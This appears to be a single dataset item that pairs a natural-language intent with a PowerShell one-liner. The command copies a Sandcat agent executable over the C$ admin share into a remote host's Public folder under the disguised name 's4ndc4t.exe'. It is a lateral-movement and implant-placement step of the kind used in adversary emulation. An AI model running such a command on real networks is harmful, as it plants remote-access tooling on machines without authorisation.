# Natural language intent:
# Copy Sandcat executable to a remote system's 'Public' folder on the C drive.

$path = "sandcat.go-windows"; ; $drive = "\\${remote.host.fqdn}\C$"; ; Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
